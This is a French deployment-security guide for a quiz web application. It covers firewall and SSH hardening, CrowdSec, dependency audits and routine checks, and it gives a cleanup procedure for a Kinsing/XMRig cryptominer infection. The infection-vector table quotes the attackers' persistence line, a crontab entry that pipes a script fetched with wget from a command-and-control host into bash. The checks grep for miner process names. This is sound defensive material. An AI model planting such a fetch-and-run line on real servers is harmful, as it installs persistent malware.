# Guide de sécurité — QCM-Patentino

Ce document décrit les bonnes pratiques de sécurité à appliquer dès le premier déploiement, ainsi que la procédure à suivre en cas d'incident.

---

## Checklist de déploiement initial

A faire dans cet ordre, avant de déployer le code.

### 1. Firewall (UFW)

```bash
sudo ufw default deny incoming
sudo ufw default allow outgoing
sudo ufw allow 22/tcp      # adapter si port SSH personnalisé
sudo ufw allow 80/tcp
sudo ufw allow 443/tcp
sudo ufw enable
sudo ufw status
```

Vérifier que le port du backend (5500) et les autres ports internes ne sont PAS ouverts.

### 2. SSH

Editer `/etc/ssh/sshd_config` :

```
PasswordAuthentication no
PermitRootLogin no
Port 2222          # changer le port par défaut
```

```bash
sudo systemctl restart ssh
```

### 3. CrowdSec

```bash
curl -fsSL https://install.crowdsec.net | sudo sh
sudo apt install -y crowdsec crowdsec-firewall-bouncer-iptables
sudo systemctl status crowdsec
```

CrowdSec surveille automatiquement les logs Nginx, SSH et MySQL et bloque les IPs malveillantes en temps réel, en s'appuyant sur une liste noire communautaire mondiale.

### 4. Mots de passe

Changer tous les mots de passe par défaut dès la création du serveur :

- Utilisateur Linux (deploy)
- Root Linux
- MySQL root
- MySQL quizuser

```bash
passwd                          # mot de passe deploy
sudo passwd root                # mot de passe root
sudo mysql -u root
```

```sql
ALTER USER 'quizuser'@'localhost' IDENTIFIED BY 'NouveauMotDePasse';
FLUSH PRIVILEGES;
EXIT;
```

Ne jamais mettre les mots de passe dans le code ou dans git. Utiliser uniquement des fichiers `.env` qui figurent dans `.gitignore`.

### 5. Audit des dépendances

```bash
cd quiz-frontend && npm audit --audit-level=high
cd quiz-backend  && npm audit --audit-level=high
```

Corriger les vulnérabilités avant de déployer :

```bash
npm audit fix --legacy-peer-deps
```

### 6. PM2 avec démarrage automatique

```bash
pm2 start npm --name quiz-frontend -- start
pm2 start npm --name quiz-backend -- start
pm2 save
pm2 startup    # suivre les instructions affichées
```

---

## Script de déploiement

Fichier `~/deploy.sh` sur le serveur :

```bash
#!/bin/bash
set -e
cd /var/www/QCM-Patentino
git fetch origin main
git reset --hard origin/main
cd quiz-frontend
npm ci
npm audit --audit-level=high || exit 1
npm run build
pm2 restart quiz-frontend
echo "Deploiement termine."
```

```bash
chmod +x ~/deploy.sh
bash ~/deploy.sh
```

---

## Vérifications régulières

A faire après chaque déploiement et en cas de comportement suspect :

```bash
# Processus PM2
pm2 status

# Processus malveillants connus
ps aux | grep -E "kinsing|xmrig|kdev|Sofia"

# Crontab (ne doit rien contenir en production)
crontab -l
sudo crontab -l

# Connexions réseau sortantes suspectes
ss -tnp

# Fichiers exécutables dans le projet
find /var/www -type f -executable | grep -v node_modules | grep -v ".git" | grep -v ".next"

# Fichiers suspects dans /tmp
ls -la /tmp
```

---

## Réponse à un incident (cryptominer)

Procédure appliquée lors de l'infection par Kinsing/XMRig en mars 2026.

### Identification

```bash
# CPU à 100% = signe d'un miner
htop

# Chercher les processus suspects
ps aux | grep -E "kinsing|xmrig|kdev|ini"

# Connexions vers des pools de minage
ss -tnp
```

### Suppression

```bash
# Tuer les processus malveillants
sudo kill -9 <PID>

# Supprimer les binaires
sudo rm -f /tmp/kinsing /tmp/kdevtmpfsi /tmp/libsystem.so
find /var/www -name "xmrig" -o -name "scanner_linux" -o -name "x86_64" 2>/dev/null | xargs sudo rm -f

# Supprimer le crontab malveillant
crontab -r
sudo crontab -r

# Bloquer l'IP du serveur C2
sudo ufw deny out to <IP_C2>
```

### Recherche de persistance

```bash
# Crontabs système
sudo cat /etc/crontab
sudo ls /etc/cron.d/
sudo ls /etc/cron.hourly/

# Bashrc de tous les utilisateurs
cat ~/.bashrc
sudo cat /root/.bashrc

# Services systemd suspects
sudo ls /etc/systemd/system/
sudo systemctl list-units --type=service

# Fichiers dans les répertoires temporaires
find /tmp /var/tmp /dev/shm -type f 2>/dev/null
```

### Vecteurs d'infection connus

| Vecteur | Description | Correction |
|---------|-------------|------------|
| Port backend exposé | Le port 5500 accessible depuis internet permet des attaques directes sur l'API | Bloquer avec UFW, n'exposer que via Nginx |
| Crontab malveillant | `* * * * * wget http://IP/re.sh | bash` réinstalle le miner toutes les minutes | `crontab -r` + bloquer l'IP C2 |
| Binaire dans le projet | Exécutable caché dans `/var/www` (ex: `xmrig-6.21.0/xmrig`) | `find /var/www -type f -executable` |
| Bashrc infecté | Ligne ajoutée dans `~/.bashrc` pour relancer le miner à chaque connexion | Vérifier et nettoyer le fichier |

---

## Architecture réseau sécurisée

```
Internet
    |
  443 / 80  (Nginx)
    |
    +---> :3000  Next.js     [localhost uniquement]
    +---> :5500  Express     [localhost uniquement]

UFW : tout le reste est bloque
CrowdSec : IPs malveillantes bloquees automatiquement
Fail2ban : protection SSH et Nginx
```

---

## Outils installés sur le serveur

| Outil | Rôle |
|-------|------|
| UFW | Firewall, bloque les ports non autorisés |
| CrowdSec | Détection et blocage automatique des attaquants |
| Fail2ban | Protection contre les attaques par force brute |
| PM2 | Gestionnaire de processus Node.js avec redémarrage automatique |
| Certbot | Certificats SSL automatiques (Let's Encrypt) |
